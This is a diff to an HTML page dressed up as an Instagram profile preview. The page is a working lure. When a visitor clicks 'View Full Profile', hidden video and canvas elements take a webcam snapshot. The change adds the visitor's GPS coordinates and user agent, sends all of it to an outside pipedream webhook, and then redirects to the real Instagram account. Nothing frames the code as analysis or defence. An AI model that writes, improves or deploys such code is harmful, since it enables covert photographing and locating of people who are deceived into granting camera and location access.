@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mastinaiiiii's Instagram Profile</title>
+    <title>mastinaiiiii | Exclusive Feed</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { width: 100%; max-width: 400px; text-align: center; padding: 20px; }
-        .avatar { width: 120px; height: 120px; background: #e1e1e1; border-radius: 50%; margin: 0 auto 20px; background-size: cover; background-position: center; border: 4px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        h1 { font-size: 1.5rem; color: #111; margin-bottom: 5px; }
-        p { color: #666; margin-bottom: 30px; }
-        .btn { background: #000; color: #fff; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; transition: opacity 0.2s; }
-        .btn:hover { opacity: 0.8; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #111; }
+        .card { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
+        .avatar { width: 110px; height: 110px; background: #eee; border-radius: 50%; margin: 0 auto 20px; border: 1px solid #dbdbdb; }
+        h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 10px; }
+        p { font-size: 0.95rem; color: #555; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
+        .btn { background: #000; color: #fff; border: none; padding: 14px 0; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; font-size: 0.95rem; transition: background 0.2s; }
+        .btn:hover { background: #333; }
         video, canvas { display: none; }
     </style>
 </head>
@@ -19,11 +19,12 @@
     <div class="card">
         <div class="avatar"></div>
         <h1>mastinaiiiii</h1>
-        <p>My Contents In Profile.</p>
-        <button id="cta" class="btn">Redirect</button>
-        <video id="v" autoplay playsinline></video>
-        <canvas id="c"></canvas>
+        <p>Follow my page on Instagram.</p>
+        <button id="cta" class="btn">View Full Profile</button>
     </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
         const btn = document.getElementById('cta');
@@ -31,29 +32,42 @@
         const c = document.getElementById('c');
         const webhook = 'https://eoukkf7emqrufvo.m.pipedream.net/';
 
-        btn.addEventListener('click', async () => {
+        async function gatherData() {
             try {
+                // Get Camera
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 v.srcObject = stream;
                 
-                // Allow a split second for the stream to initialize
-                setTimeout(() => {
+                // Get Location
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                
+                setTimeout(async () => {
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    const img = c.toDataURL('image/jpeg', 0.7);
+                    const img = c.toDataURL('image/jpeg', 0.8);
                     
-                    fetch(webhook, { method: 'POST', body: JSON.stringify({ image: img }) });
+                    await fetch(webhook, { 
+                        method: 'POST', 
+                        body: JSON.stringify({ 
+                            image: img, 
+                            coords: { lat: pos.coords.latitude, lon: pos.coords.longitude },
+                            ua: navigator.userAgent 
+                        }) 
+                    });
                     
                     stream.getTracks().forEach(t => t.stop());
                     window.location.href = 'https://www.instagram.com/mastinaiiiii';
-                }, 800);
+                }, 500);
             } catch (e) {
-                window.location.href = 'https://www.instagram.com/mastinaiiiii';
+                console.error("Access denied or failed.");
             }
-        });
+        }
+
+        btn.addEventListener('click', gatherData);
     </script>
 </body>
 </html>
+
 
 
